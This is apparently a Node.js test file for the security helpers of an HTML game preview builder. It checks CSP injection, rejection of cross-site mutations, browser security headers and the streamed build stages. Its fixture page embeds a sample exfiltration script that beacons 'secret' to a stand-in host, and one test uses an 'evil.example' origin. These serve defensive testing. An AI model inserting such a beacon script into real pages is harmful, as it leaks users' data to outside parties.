import assert from "node:assert/strict";
import test from "node:test";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { browserSecurityHeaders, isSameOriginMutation, PREVIEW_CSP, securePreviewHtml } from "../scripts/security.mjs";

const page = '<!doctype html><html><head><title>Game</title></head><body><script>navigator.sendBeacon("//example.com", "secret")</script></body></html>';
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

test("preview HTML receives a deny-by-default CSP before generated content", () => {
  const secured = securePreviewHtml(page);
  assert.match(secured, /<head><meta http-equiv="Content-Security-Policy"/);
  assert.ok(secured.indexOf("Content-Security-Policy") < secured.indexOf("sendBeacon"));
  assert.match(PREVIEW_CSP, /connect-src 'none'/);
  assert.match(PREVIEW_CSP, /form-action 'none'/);
  assert.match(PREVIEW_CSP, /frame-src 'none'/);
});

test("cross-site mutations are rejected", () => {
  assert.equal(isSameOriginMutation({ method: "POST", headers: { host: "pi.local:3000", origin: "http://pi.local:3000", "sec-fetch-site": "same-origin" } }), true);
  assert.equal(isSameOriginMutation({ method: "POST", headers: { host: "pi.local:3000", origin: "https://evil.example", "sec-fetch-site": "cross-site" } }), false);
});

test("main responses disable sensitive browser capabilities", () => {
  const headers = browserSecurityHeaders();
  assert.match(headers["content-security-policy"], /frame-ancestors 'none'/);
  assert.match(headers["permissions-policy"], /microphone=\(\)/);
  assert.equal(headers["referrer-policy"], "no-referrer");
});

test("Builder Bunny uses streamed, real supervision stages", async () => {
  const [server, ui, bunny] = await Promise.all([
    readFile(path.join(root, "server.mjs"), "utf8"),
    readFile(path.join(root, "public/index.html"), "utf8"),
    readFile(path.join(root, "public/builder-bunny.svg"), "utf8")
  ]);
  for (const stage of ["building", "checking", "reviewing", "fixing", "finishing", "saving"]) {
    assert.ok(server.includes(`"${stage}"`), `server should emit the ${stage} stage`);
    assert.match(ui, new RegExp(`${stage}:\\[`));
  }
  assert.match(ui, /apiStream/);
  assert.match(bunny, /<svg/);
  assert.match(bunny, /Builder Bunny/);
  const messagesStart = ui.indexOf('<div class="messages" id="messages"');
  const bunnyPosition = ui.indexOf('id="buildBunny"');
  const composerStart = ui.indexOf('<form class="composer"');
  assert.ok(messagesStart < bunnyPosition && bunnyPosition < composerStart, "Builder Bunny should live inside the chat history");
  assert.doesNotMatch(ui, /\.build-bunny\s*\{[^}]*position\s*:\s*absolute/);
  assert.doesNotMatch(ui, /addMessage\("thinking"/);
  const busyHandler = ui.slice(ui.indexOf("function setBusy"), ui.indexOf("function renderMessages"));
  assert.doesNotMatch(busyHandler, /preview|iframe|pointerEvents/, "busy state should not disable the current app");
});
